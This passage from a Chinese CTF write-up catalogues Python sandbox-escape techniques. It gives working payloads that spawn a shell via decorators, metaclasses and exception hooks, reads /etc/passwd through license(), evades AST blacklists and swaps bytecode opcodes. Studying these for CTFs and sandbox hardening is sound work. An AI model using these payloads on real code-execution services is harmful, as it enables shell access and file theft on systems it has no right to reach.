... class X:
...     pass
... 
&lt;class &#x27;__main__.X&#x27;&gt;__import__(&quot;os&quot;).system(&quot;ls&quot;)</code></pre>

<p>由于装饰器不会被解析为调用表达式或语句, 因此可以绕过黑名单, 最终传入的 payload 是由 input 接收的, 因此也不会被拦截.</p>
<p>其实这样的话,构造其实可以有很多,比如使用单层的装饰器，打开 help 函数.</p>
<pre><code class="highlight plaintext">@help
class X:
    pass</code></pre>

<p>这样可以直接进入帮助文档:</p>
<pre><code class="highlight plaintext">Help on class X in module __main__:

class X(builtins.object)
 |  Data descriptors defined here:
 |  
 |  __dict__
 |      dictionary for instance variables (if defined)
 |  
 |  __weakref__
 |      list of weak references to the object (if defined)
(END)</code></pre>

<p>再次输入 !sh 即可打开 &#x2F;bin&#x2F;sh</p>
<p>或是给装饰器加一些参数。</p>
<pre><code class="highlight plaintext">import os

def fake_wrapper(f):
  return &#x27;/bin/sh&#x27;

@getattr(os,&quot;system&quot;)
@fake_wrapper
def something():
  pass</code></pre>

<p>相当于：</p>
<pre><code class="highlight plaintext">getattr(os,&quot;system&quot;)(fake_wrapper(something))</code></pre>

<p>亦或者自定义一个装饰器：</p>
<pre><code class="highlight plaintext">import os

def fake_wrapper(f):
  return &#x27;/bin/sh&#x27;

@os.system
@fake_wrapper
def something():
  pass</code></pre>

<p>相当于 <code>os.system(fake_wrapper(something))</code>，也就是 <code>os.system(‘/bin/sh’)</code></p>
<h5 id="函数覆盖"><a href="#函数覆盖" class="headerlink" title="函数覆盖"></a><strong>函数覆盖</strong></h5><p>我们知道在 Python 中获取一个的属性例如 <code>obj[argument]</code> 实际上是调用的 <code>obj.__getitem__</code> 方法.因此只需要覆盖其 <code>__getitem__</code> 方法, 即可在使用 <code>obj[argument]</code> 执行代码:</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; class A:
...     __getitem__ = exec
... 
&gt;&gt;&gt; A()[&#x27;__import__(&quot;os&quot;).system(&quot;ls&quot;)&#x27;]</code></pre>

<p>但是这里调用了 A 的构造函数, 因此 AST 中还是会出现 <code>ast.Call</code>. 如何在不执行构造函数的情况下获取类实例呢?</p>
<p><strong><code>metaclass</code> 利用</strong></p>
<p>Python 中提供了一种元类(<code>metaclass</code>)概念。元类是创建类的“类”。在 Python中，类本身也是对象，元类就是创建这些类（即类的对象）的类。</p>
<p>元类在 Python 中的作用主要是用来创建类。类是对象的模板，而元类则是类的模板。元类定义了类的行为和属性，就像类定义了对象的行为和属性一样。</p>
<p>下面是基于元类的 payload, 在不使用构造函数的情况下触发</p>
<pre><code class="highlight plaintext">class Metaclass(type):
    __getitem__ = exec 
    
class Sub(metaclass=Metaclass):
    pass

Sub[&#x27;import os; os.system(&quot;sh&quot;)&#x27;]</code></pre>

<p>除了 <code>__getitem__</code> 之外其他方法的利用方式如下:</p>
<pre><code class="highlight plaintext">__sub__ (k - &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__mul__ (k * &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__floordiv__ (k // &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__truediv__ (k / &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__mod__ (k % &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__pow__ (k**&#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__lt__ (k &lt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__le__ (k &lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__eq__ (k == &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ne__ (k != &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ge__ (k &gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__gt__ (k &gt; &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__iadd__ (k += &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__isub__ (k -= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__imul__ (k *= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ifloordiv__ (k //= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__idiv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__itruediv__ (k /= &#x27;import os; os.system(&quot;sh&quot;)&#x27;) (Note that this only works when from __future__ import division is in effect.)
__imod__ (k %= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ipow__ (k **= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ilshift__ (k&lt;&lt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__irshift__ (k &gt;&gt;= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__iand__ (k = &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ior__ (k |= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)
__ixor__ (k ^= &#x27;import os; os.system(&quot;sh&quot;)&#x27;)</code></pre>

<p>示例:</p>
<pre><code class="highlight plaintext">class Metaclass(type):
    __sub__ = exec
    
class Sub(metaclass=Metaclass):
    pass

Sub-&#x27;import os; os.system(&quot;sh&quot;)&#x27;</code></pre>

<p><strong>exceptions 利用</strong></p>
<p>利用 exceptions 的目的也是为了绕过显示地实例化一个类, 如果一个类继承了 Exception 类, 那么就可以通过 raise 关键字来实例化. payload 如下:</p>
<pre><code class="highlight plaintext">class RCE(Exception):
    def __init__(self):
        self += &#x27;import os; os.system(&quot;sh&quot;)&#x27;
    __iadd__ = exec 
    
raise RCE</code></pre>

<p>raise 会进入 RCE 的 <code>__init__</code>, 然后触发 <code>__iadd__</code> 也就是 exec.</p>
<p>当然, 触发异常不一定需要 raise, 主动地编写错误代码也可以触发,与是就有了如下的几种 payload.</p>
<pre><code class="highlight plaintext">class X:
    def __init__(self, a, b, c):
        self += &quot;os.system(&#x27;sh&#x27;)&quot;
    __iadd__ = exec
sys.excepthook = X
1/0</code></pre>

<p>这个 payload 中直接将 sys.excepthook 进行覆盖,任何异常产生时都会触发.</p>
<pre><code class="highlight plaintext">class X():
  def __init__(self, a, b, c, d, e):
    self += &quot;print(open(&#x27;flag&#x27;).read())&quot;
  __iadd__ = eval
__builtins__.__import__ = X
&#123;&#125;[1337]</code></pre>

<p>这个 payload 将 <code>__import__</code> 函数进行覆盖, 最后的 {}[1337] 在正常情况下会引发 KeyError 异常，因为 Python 在引发异常时会尝试导入某些模块（比如traceback 模块），导入时就会触发 <code>__import__</code>.</p>
<h5 id="通过-license-函数读取文件"><a href="#通过-license-函数读取文件" class="headerlink" title="通过 license 函数读取文件"></a>通过 license 函数读取文件</h5><pre><code class="highlight plaintext">__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]
a = __builtins__.help
a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass</code></pre>

<p>上面的 payload 修改内建函数 license 的文件名列表为 &#x2F;etc&#x2F;passwd 当调用 <code>license()</code> 时会打印这个文件的内容.</p>
<pre><code class="highlight plaintext">&gt;&gt;&gt; __builtins__.__dict__[&quot;license&quot;]._Printer__filenames
[&#x27;/usr/lib/python3.11/../LICENSE.txt&#x27;, &#x27;/usr/lib/python3.11/../LICENSE&#x27;, &#x27;/usr/lib/python3.11/LICENSE.txt&#x27;, &#x27;/usr/lib/python3.11/LICENSE&#x27;, &#x27;./LICENSE.txt&#x27;, &#x27;./LICENSE&#x27;]</code></pre>

<p>payload 中将 help 类的 <code>__enter__</code> 方法覆盖为 <code>license</code> 方法, 而 with 语句在创建上下文时会调用 help 的<code>__enter__</code>, 从而执行 <code>license</code> 方法. 这里的 help 类只是一个载体, 替换为其他的支持上下文的类或者自定义一个类也是可以的. 例如:</p>
<pre><code class="highlight plaintext">class MyContext:
    pass
    
__builtins__.__dict__[&quot;license&quot;]._Printer__filenames=[&quot;/etc/passwd&quot;]
a = MyContext()
a.__class__.__enter__ = __builtins__.__dict__[&quot;license&quot;]
a.__class__.__exit__ = lambda self, *args: None
with (a as b):
    pass</code></pre>

<h4 id="打印-AST"><a href="#打印-AST" class="headerlink" title="打印 AST"></a>打印 AST</h4><pre><code class="highlight plaintext">import os
import ast 

BAD_ATS = &#123;
  ast.Attribute,
  ast.AST,
  ast.Subscript,
  ast.comprehension,
  ast.Delete,
  ast.Try,
  ast.For,
  ast.ExceptHandler,
  ast.With,
  ast.Import,
  ast.ImportFrom,
  ast.Assign,
  ast.AnnAssign,
  ast.Constant,
  ast.ClassDef,
  ast.AsyncFunctionDef,
&#125;

a = &#x27;&#x27;&#x27;
[
    system:=111,
    bash:=222
]
&#x27;&#x27;&#x27;
print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))


for x in ast.walk(compile(a, &quot;&lt;QWB7th&gt;&quot;, &quot;exec&quot;, flags=ast.PyCF_ONLY_AST)):
  if type(x) in BAD_ATS:
    print(type(x))
    exit()

print(&quot;[+] OK&quot;)</code></pre>

<h4 id="绕过-ast-Attribute-获取属性"><a href="#绕过-ast-Attribute-获取属性" class="headerlink" title="绕过 ast.Attribute 获取属性"></a>绕过 ast.Attribute 获取属性</h4><p>如何绕过 ast.Attribute？python 3.10 中引入了一个新的特性：match&#x2F;case，类似其他语言中的 switch&#x2F;case，但 match&#x2F;case 更加强大，除了可以匹配数字字符串之外，还可以匹配字典、对象等。</p>
<p>最简单的示例，匹配字符串：</p>
<pre><code class="highlight plaintext">item = 2

match item:
    case 1:
        print(&quot;One&quot;)
    case 2:
        print(&quot;Two&quot;)

# Two</code></pre>

<p>还可以匹配并自动赋值给局部变量，传入 (1,2) 时，会进入第二个分支，并对 x,y 赋值。</p>
<pre><code class="highlight plaintext">item = (1, 2)

match item:
    case (x, y, z):
        print(f&quot;&#123;x&#125; &#123;y&#125; &#123;z&#125;&quot;)
    case (x, y):
        print(f&quot;&#123;x&#125; &#123;y&#125;&quot;)
    case (x,):
        print(f&quot;&#123;x&#125;&quot;)</code></pre>

<p>对于基本类型的匹配比较好理解，下面是一个匹配类的示例：</p>
<pre><code class="highlight plaintext">class AClass:
    def __init__(self, value):
        self.thing = value

item = AClass(32)

match item:
    case AClass(thing=x):
        print(f&quot;Got &#123;x = &#125;!&quot;)

# Got x = 32!</code></pre>

<p>在这个示例中，重点关注<code>case AClass(thing=x)</code>，这里的含义并非是将 x 赋值给 thing，我们需要将其理解为一个表达式，表示匹配类型为 <code>AClass</code> 且存在 thing 属性的对象，并且 thing 属性值自动赋值给 x。</p>
<p>这样一来就可以在不适用 . 号的情况下获取到类的属性值。例如获取 <code>&#39;&#39;.__class__</code>，可以编写如下的 match&#x2F;case 语句：</p>
<pre><code class="highlight plaintext">match str():
    case str(__class__=x):
        print(x==&#x27;&#x27;.__class__)

# True</code></pre>

<p>可以看到 x 就是 <code>&#39;&#39;.__class__</code>. 因为所有的类都输入 object 类，所以可以使用 object 来替代 str，这样就无需关注匹配到的到底是哪个类。</p>
<pre><code class="highlight plaintext">match str():
    case object(__class__=x):
        print(x==&#x27;&#x27;.__class__)

# True</code></pre>

<p>再测试一下该 payload 的 AST：</p>
<pre><code class="highlight plaintext">import os
import ast 

a = &#x27;&#x27;&#x27;
match str():
    case str(__class__=x):
        print(x)
&#x27;&#x27;&#x27;
print(ast.dump(ast.parse(a, mode=&#x27;exec&#x27;), indent=4))</code></pre>

<p>AST 如下：</p>
<pre><code class="highlight plaintext">Module(
    body=[
        Match(
            subject=Call(
                func=Name(id=&#x27;str&#x27;, ctx=Load()),
                args=[],
                keywords=[]),
            cases=[
                match_case(
                    pattern=MatchClass(
                        cls=Name(id=&#x27;str&#x27;, ctx=Load()),
                        patterns=[],
                        kwd_attrs=[
                            &#x27;__class__&#x27;],
                        kwd_patterns=[
                            MatchAs(name=&#x27;x&#x27;)]),
                    body=[
                        Expr(
                            value=Call(
                                func=Name(id=&#x27;print&#x27;, ctx=Load()),
                                args=[
                                    Name(id=&#x27;x&#x27;, ctx=Load())],
                                keywords=[]))])])],
    type_ignores=[])</code></pre>

<p>可以看到确实没有 Attribute，依据这个原理，就可以绕过 ast.Attribute</p>
<p>我们可以构造替代 <code>&#39;&#39;.__class__.__base__.__subclasses__()</code>的 payload：</p>
<pre><code class="highlight plaintext">match str():
    case object(__class__=clazz):
        match clazz:
            case object(__base__=bass):
                match bass:
                    case object(__subclasses__=subclazz):
                        print(subclazz)</code></pre>

<h4 id="绕过-ast-Assign-赋值变量"><a href="#绕过-ast-Assign-赋值变量" class="headerlink" title="绕过 ast.Assign 赋值变量"></a>绕过 ast.Assign 赋值变量</h4><p>ast.Assign 无法使用时，我们无法直接使用 &#x3D; 来进行赋值，此时可以使用海象表达式进行绕过。例如：</p>
<pre><code class="highlight plaintext">[
    system:=111,
    bash:=222
]</code></pre>

<p>此时 AST 树如下,海象表达式用到的是 ast.NamedExpr 而非 ast.Assign</p>
<pre><code class="highlight plaintext">Module(
    body=[
        Expr(
            value=List(
                elts=[
                    NamedExpr(
                        target=Name(id=&#x27;system&#x27;, ctx=Store()),
                        value=Constant(value=111)),
                    NamedExpr(
                        target=Name(id=&#x27;bash&#x27;, ctx=Store()),
                        value=Constant(value=222))],
                ctx=Load()))],
    type_ignores=[])</code></pre>

<h4 id="绕过-ast-Constant-获取数字、字符串"><a href="#绕过-ast-Constant-获取数字、字符串" class="headerlink" title="绕过 ast.Constant 获取数字、字符串"></a>绕过 ast.Constant 获取数字、字符串</h4><p>题目限制了 ast.Constant，所以无法直接使用数字、字符串常量，但通过其他的函数组合可以构造出数字和字符串。 例如：</p>
<pre><code class="highlight plaintext">&quot;&quot; : str()
0  : len([])
&quot;0&quot;: str(len([]))
&quot;1&quot;: str(len([str()])) 或 str(len([min]))
&quot;2&quot;: str(len([str(),str()])) 或 str(len([min,max]))
&#x27;A&#x27;: chr(len([min,min,min,min,min])*len([min,min,min,min,min,min,min,min,min,min,min,min,min]))</code></pre>

<p>如果要用数字来构造字符串，通常需要用到 chr 函数，虽然题目的 builtins 没有直接提供 chr 函数，但也可以自己手动实现一个 chr。</p>
<p>当然，题目 builtins 允许 dict 和 list，因此可以直接用这两个函数直接构造出字符串，这种方式在我此前的博客：<a href="https://dummykitty.github.io/python/2023/05/30/pyjail-bypass-02-%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%8D%A2%E7%BB%95%E8%BF%87.html#list--dict">pyjail bypass-02 绕过基于字符串匹配的过滤</a> 中有提到过。</p>
<p>在这个 payload 中，需要构造出 _wrap_close、system、bash</p>
<pre><code class="highlight plaintext">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;bash&quot;)</code></pre>

<p>那么就可以通过下面的方式获取到这几个字符串：</p>
<pre><code class="highlight plaintext">list(dict(system=[]))[0]            # system
list(dict(_wrap_close=[]))[0]       # _wrap_close
list(dict(bash=[]))[0]              # bash</code></pre>

<h4 id="绕过-ast-Subscript-获取列表-字典元素"><a href="#绕过-ast-Subscript-获取列表-字典元素" class="headerlink" title="绕过 ast.Subscript 获取列表&#x2F;字典元素"></a>绕过 ast.Subscript 获取列表&#x2F;字典元素</h4><p>题目同时限定了 ast.Subscript，因此无法直接使用索引。但 BUILTINS 中给出了 min 函数，该函数可以获取列表中最小的元素，当列表中只有一个元素时，就可以直接取值。</p>
<pre><code class="highlight plaintext">min(list(dict(system=[])))            # system
min(list(dict(_wrap_close=[])))       # _wrap_close
min(list(dict(bash=[])))              # bash</code></pre>

<p>如果要获取字典元素，可以利用 get 函数来替代 Subscript。例如我需要在 globals 字典中获取 key 为 system 的元素，可以配合 match&#x2F;case 来获取。</p>
<pre><code class="highlight plaintext">match globals:
    case object(get=get_func):
        get_func(&quot;system&quot;)</code></pre>

<h4 id="绕过-ast-For-遍历列表"><a href="#绕过-ast-For-遍历列表" class="headerlink" title="绕过 ast.For 遍历列表"></a>绕过 ast.For 遍历列表</h4><p>在构造最终 payload 中，我们还需要在 <code>__subclasses__()</code>得到的列表中获取到 _wrap_close 类。</p>
<pre><code class="highlight plaintext">[ x.__init__.__globals__ for x in &#x27;&#x27;.__class__.__base__.__subclasses__() if x.__name__==&quot;_wrap_close&quot;][0][&quot;system&quot;](&quot;bash&quot;)</code></pre>

<p>当列表中不只有一个元素且列表中的元素之间无法比较时，正常情况下可以使用 for 来遍历并判断，但 ast.For 被题目过滤了，此时可以使用 filter，如下所示：</p>
<pre><code class="highlight plaintext">def filter_func(subclazzes_item):
    [ _wrap_close:=min(list(dict(_wrap_close=[])))]
    match subclazzes_item:
        case object(_＿name_＿=name):
            if name==_wrap_close:
                return subclazzes_item
[
    subclazzes_item:=min(filter(filter_func,subclazzes()))
]</code></pre>

<p>fitler 中使用 match&#x2F;case 和 if 来进行过滤。</p>
<p>除了使用 filter 函数外，还可以使用<code> iter</code> 和 <code>next</code> 函数来遍历列表，但题目 BUILTINS 中没有给出这两个函数。</p>
<h4 id="绕过ast-GeneratorExp获取生成器栈帧"><a href="#绕过ast-GeneratorExp获取生成器栈帧" class="headerlink" title="绕过ast.GeneratorExp获取生成器栈帧"></a>绕过<code>ast.GeneratorExp</code>获取生成器栈帧</h4><p>思路来自于 [<a href="https://maplebacon.org/2024/02/dicectf2024-irs/">DiceCTF 2024] IRS</a></p>
<p>payload 如下，且 AST 中不会出现 <code>ast.GeneratorExp</code>。</p>
<pre><code class="highlight plaintext">def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame)</code></pre>

<p>如何理解这段代码：</p>
<ol>
<li>首先声明了一个生成器 f，<ol>
<li>f 内部声明了全局变量 x 和 frame，意味着会在函数外部对其进行操作。</li>
</ol>
</li>
<li>x &#x3D; f() 会实例化一个生成器，但由于生成器的延迟加载，此时生成器不会执行。</li>
<li>x.send(None)：这行代码启动了生成器，并让它执行到第一个 yield 语句。</li>
</ol>
<p>测试代码如下：</p>
<pre><code class="highlight plaintext">import ast

flag = &quot;flag&#123;12345&#125;&quot;
code = &#x27;&#x27;&#x27;
def f():
    global x, frame
    frame = x.gi_frame.f_back.f_back
    yield
x = f()
x.send(None)
print(frame.f_globals)
&#x27;&#x27;&#x27;

print(ast.dump(ast.parse(code, mode=&#x27;exec&#x27;), indent=4))
root = ast.parse(code)
compiled_code = compile(code,&quot;&lt;sandbox&gt;&quot;, &quot;exec&quot;)
# 又是一段严防死守的过滤
exec(
    compiled_code,
    None,   # globals，也可能是其他值
    None    # locals，也可能是其他值
)</code></pre>

<h3 id="OPcode"><a href="#OPcode" class="headerlink" title="OPcode"></a><code>OPcode</code></h3><p>见过pickle的大概都知道OPcode是个什么东西</p>
<blockquote>
<p>opcode又称为操作码，是将python源代码进行编译之后的结果，python虚拟机无法直接执行human-readable的源代码，因此python编译器第一步先将源代码进行编译，以此得到opcode。例如在执行python程序时一般会先生成一个pyc文件，pyc文件就是编译后的结果，其中含有opcode序列。</p>
</blockquote>
<p>那么如何查看一个函数的opcode呢，写个例子看看先</p>
<pre><code class="highlight plaintext">import dis

code_str = &#x27;print(&quot;a&quot;)&#x27;
code = compile(code_str, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)

dis.dis(code)

print(&quot;\nconsts: &quot;, code.co_consts)
print(&quot;names: &quot;, code.co_names)
print(&quot;code: &quot;, code.co_code.hex())</code></pre>

<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250704170021243.png" alt="image-20250704170021243"></p>
<h4 id="IMPORT-FROM、LOAD-ATTR-相互替换"><a href="#IMPORT-FROM、LOAD-ATTR-相互替换" class="headerlink" title="IMPORT_FROM、LOAD_ATTR 相互替换"></a>IMPORT_FROM、LOAD_ATTR 相互替换</h4><p>思路来自于:</p>
<ul>
<li><a href="https://sekai.team/blog/lactf-2023/pycjail">LA CTF 2023 – Pycjail  Project SEKAI</a></li>
<li><a href="https://kmh.zone/blog/2021/02/07/ti1337-plus-ce/#another-way-to-leak">TI-1337 Plus CE: Abusing CPython internals  kmh’s blog</a></li>
</ul>
<p>LOAD_ATTR 可以和 IMPORT_FROM 直接替换。</p>
<h4 id="LOAD-NAME-LOAD-ATTR"><a href="#LOAD-NAME-LOAD-ATTR" class="headerlink" title="LOAD_NAME &amp; LOAD_ATTR"></a>LOAD_NAME &amp; LOAD_ATTR</h4><p>LOAD_ATTR 是用来从对象中获取属性的字节码指令。它通常用于从一个已经加载到栈上的对象（如模块或类实例）中获取某个属性。</p>
<p>例如导入 os.system 函数</p>
<pre><code class="highlight plaintext">import os
os.system</code></pre>

<p>对应的字节码如下，其中最为关键的就是 LOAD_NAME 和 LOAD_ATTR。</p>
<pre><code class="highlight plaintext">  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 (None)
              4 IMPORT_NAME              0 (os)
              6 STORE_NAME               0 (os)

  3           8 LOAD_NAME                0 (os)
             10 LOAD_ATTR                1 (system)
             12 POP_TOP
             14 LOAD_CONST               1 (None)
             16 RETURN_VALUE

consts:  (0, None)
names:  (&#x27;os&#x27;, &#x27;system&#x27;)
code:  640064016c005a0065006a01010064015300
6400 -&gt; LOAD_CONST, consts[0] -&gt; 0
6401 -&gt; LOAD_CONST, consts[1] -&gt; None
6c00 -&gt; IMPORT_NAME, names[0] -&gt; os
5a00 -&gt; STORE_NAME, names[0] -&gt; os
6500 -&gt; LOAD_NAME, names[0] -&gt; os
6a01 -&gt; LOAD_ATTR, names[1] -&gt; system
0100 -&gt; POP_TOP
6401 -&gt; LOAD_CONST, consts[1] -&gt; None
5300 -&gt; RETURN_VALUE</code></pre>

<h4 id="IMPORT-NAME-IMPORT-FROM"><a href="#IMPORT-NAME-IMPORT-FROM" class="headerlink" title="IMPORT_NAME &amp; IMPORT_FROM"></a>IMPORT_NAME &amp; IMPORT_FROM</h4><p>如果使用 from 来进行函数导入:</p>
<pre><code class="highlight plaintext">from os import sys</code></pre>

<p>得到的字节码信息如下，可以看到使用的是 IMPORT_NAME 和 IMPORT_FROM 组合</p>
<pre><code class="highlight plaintext">  2           0 LOAD_CONST               0 (0)
              2 LOAD_CONST               1 ((&#x27;system&#x27;,))
              4 IMPORT_NAME              0 (os)
              6 IMPORT_FROM              1 (system)
              8 STORE_NAME               1 (system)
             10 POP_TOP
             12 LOAD_CONST               2 (None)
             14 RETURN_VALUE

consts:  (0, (&#x27;system&#x27;,), None)
names:  (&#x27;os&#x27;, &#x27;system&#x27;)
code:  640064016c006d015a01010064025300
6400 -&gt; LOAD_CONST, consts[0] -&gt; 0
6401 -&gt; LOAD_CONST, consts[1] -&gt; (&#x27;system&#x27;,)
6c00 -&gt; IMPORT_NAME, names[0] -&gt; os
6d01 -&gt; IMPORT_FROM, names[1] -&gt; system
5a01 -&gt; STORE_NAME, arg -&gt; 1
0100 -&gt; POP_TOP
6402 -&gt; LOAD_CONST, consts[2] -&gt; None
5300 -&gt; RETURN_VALUE</code></pre>

<h4 id="替换字节码"><a href="#替换字节码" class="headerlink" title="替换字节码"></a>替换字节码</h4><p>在 LACTF 2023 Pycjail 这道题的场景中，用户输入的 const、names、code 最终会替换到题目中的一个空函数中并执行。排除掉题目其他的过滤，大致的逻辑如下：</p>
<ol>
<li>填充 f 函数 co_consts、co_names、co_code</li>
<li>然后执行函数。</li>
</ol>
<p>测试代码如下：</p>
<pre><code class="highlight plaintext">def f():
    pass

f.__code__ = f.__code__.replace(
    co_stacksize=10,
    co_consts=(&quot;a&quot;, 139, &quot;system&quot;, &quot;dir&quot;),
    co_names=tuple(&quot;__class__,__base__,__subclasses__,__init__,__globals__&quot;.split(&quot;,&quot;)),
    co_code=bytes.fromhex(trans_bytes(&quot;64006a006a01a002a100640119006a036a046402190064038301010064045300&quot;)),
)


print(&quot;here goes!&quot;)
frame = inspect.currentframe()
p = print
r = repr
for k in list(frame.f_globals):
    if k not in (&quot;p&quot;, &quot;r&quot;, &quot;f&quot;):
        del frame.f_globals[k]

p(r(f()))</code></pre>

<p>我们可以使用下面的脚本来生成 payload，我本地的 <code>_wrap_close</code> 的索引为 139.</p>
<pre><code class="highlight plaintext">import dis
import inspect
from test_opcode_display import display_opcode_py310
code_str = &#x27;&#x27;&#x27;
&#x27;a&#x27;.__class__.__base__.__subclasses__()[139].__init__.__globals__[&#x27;system&#x27;](&#x27;dir&#x27;)
&#x27;&#x27;&#x27;

code = compile(code_str, &#x27;&lt;string&gt;&#x27;, &#x27;exec&#x27;)

dis.dis(code)

print(&quot;\nconsts: &quot;, code.co_consts)
print(&quot;names: &quot;, code.co_names)
print(&quot;code: &quot;, code.co_code.hex())

# 64006d006d01a002a100640119006d036d046402190064038301010064045300</code></pre>

<p>LOAD_ATTR 对应操作码 6a，IMPORT_FROM 对应字节码为 6d，当我将 6a 直接替换为 6d 时，居然能够正常执行！</p>
<h3 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h3><p>在 Python 中使用 exec 函数执行代码时，默认情况下没有输出，如果想要再 exec 中打印结果，就需要在执行代码块时假如 print。</p>
<p>以<code> AmateursCTF</code> 2023 的一道题目为例，题目的源码如下：</p>
<pre><code class="highlight plaintext">#!/usr/local/bin/python
from flag import flag

for _ in [flag]:
    while True:
        try:
            code = ascii(input(&quot;Give code: &quot;))
            if &quot;flag&quot; in code or &quot;e&quot; in code or &quot;t&quot; in code or &quot;\\&quot; in code:
                raise ValueError(&quot;invalid input&quot;)
            exec(eval(code))
        except Exception as err:
            print(err)</code></pre>

<p>在这道题中，首先通过 ascii 将输入进行转化，使用 ascii 后，即使 unicode，也会被转化为 \u00xx 的形式。然后判断输入中是否出现了 flag、e、t、以及 \。这样的过滤条件基本将 unicode 绕过的方式给限制住了。过滤了 e 和 t， print、help 等输出函数也会被过滤， 而题目使用 exec 来执行 python 代码，因此除了绕过过滤之外，还需要考虑如何获取输出。</p>
<p>注意到这道题添加了一个异常处理，如果 exec 中出现错误，则会将错误信息打印出来，借助异常处理的输出，就可以将 Python 中的一些内部变量给带出来。</p>
<h4 id="利用异常处理"><a href="#利用异常处理" class="headerlink" title="利用异常处理"></a>利用异常处理</h4><p>作为客户端输入，结合当前读取变量的场景，python 中可利用的一些异常大多为：</p>
<ul>
<li><code>KeyError</code>（键错误）： 当访问字典中不存在的键时引发的错误。（用户输入的键名被应用使用）</li>
<li><code>FileNotFoundError</code>（文件未找到错误）： 在尝试打开不存在的文件时引发的错误。</li>
<li><code>ValueError</code>（值错误）： 当函数接收到正确类型的参数，但参数值不合适时引发的错误。</li>
</ul>
<p>这道题中 _ 与 flag 的值一致，因此我们只需要获取变量 _ 就可以获取 flag。</p>
<h5 id="KeyError"><a href="#KeyError" class="headerlink" title="KeyError"></a><code>KeyError</code></h5><p><code>KeyError</code> 出现在访问字典中不存在的键，利用时，可以随便构造一个字典，然后以需要读取的变量作为键名传进去。比如在这道题中输入：</p>
<pre><code class="highlight plaintext">Give code: &#123;&quot;1&quot;:&quot;2&quot;&#125;[_]
&#x27;flag&#123;xxxx&#125;&#x27;</code></pre>

<h5 id="FileNotFoundError"><a href="#FileNotFoundError" class="headerlink" title="FileNotFoundError"></a>FileNotFoundError</h5><p><code>FileNotFoundError </code>出现在找不到指定文件时，将需要读取的变量名传入文件操作函数就可以触发异常。例如 file(python2)、open 等。</p>
<p>但由于题目过滤了 e，这些函数都无法使用，如果需要测试的话可以将过滤的语句删除掉。</p>
<pre><code class="highlight plaintext">Give code: open(_)
[Errno 2] No such file or directory: &#x27;flag&#123;xxxx&#125;&#x27;</code></pre>

<h5 id="ValueError"><a href="#ValueError" class="headerlink" title="ValueError"></a>ValueError</h5><p><code>ValueError </code>比较好利用，只需要将需要读取的变量，传入一个函数，该函数的参数类型与这个要读取的变量不一致即可，例如：</p>
<pre><code class="highlight plaintext">Give code: int(_)
ValueError: invalid literal for int() with base 10: &#x27;flag&#123;xxxx&#125;&#x27;</code></pre>

<p>当然这里过滤了 t，int 函数无法使用，可以去寻找一些别的函数。</p>
<h5 id="Popen-returncode"><a href="#Popen-returncode" class="headerlink" title="Popen.returncode"></a>Popen.returncode</h5><p>在 aliyunCTF 2025 ezoj 这道题中，给出了一个使用 subprocess.Popen 执行 python 脚本，但无回显的情况，</p>
<pre><code class="highlight plaintext">process = subprocess.Popen(
    [&quot;python3&quot;, code_filename],
    stdin=infile,
    stdout=subprocess.PIPE,
    stderr=subprocess.PIPE,
    text=True,
)

try:
    stdout, stderr = process.communicate(timeout=5)
except subprocess.TimeoutExpired:
    process.kill()
    raise OJTimeLimitExceed

if process.returncode != 0:
    raise OJRuntimeError(process.returncode)</code></pre>

<p>但是题目给了一个 OJRuntimeError，并且传入了 returncode 属性。returncode 属性用于保存子进程退出时返回的退出码，反映了子进程是在正常结束还是在运行过程中出现异常。</p>
<p>这道题会将错误码发送给客户端：</p>
<pre><code class="highlight plaintext">except OJRuntimeError as e:
    return &#123;&quot;status&quot;: &quot;RE&quot;, &quot;message&quot;: f&quot;Runtime Error: ret=&#123;e.args[0]&#125;&quot;&#125;</code></pre>

<p><code>returncode</code> 的可能取值有以下几种</p>
<ul>
<li>None：表示子进程尚未终止，此时 returncode 还没有被赋值。</li>
<li>0：表示子进程成功结束，没有发生错误。</li>
<li>正整数：表示子进程执行时出现了错误，返回码通常会反映错误类型或状态码。</li>
<li>负整数：（仅在 POSIX 系统中）表示子进程被某个信号强制终止，其数值通常为 -N，其中 N 是引起终止的信号编号。</li>
</ul>
<p>由于 ascii 也是 0-255，借助这个 returncode 就可以实现回显，但 returncode 仅有一位，所以需要逐位回显。</p>
<pre><code class="highlight plaintext">import sys
...

content_len = len(content)
if &#123;loc&#125; &lt; content_len:
    sys.exit(content[&#123;loc&#125;])
else:
    sys.exit(255)</code></pre>

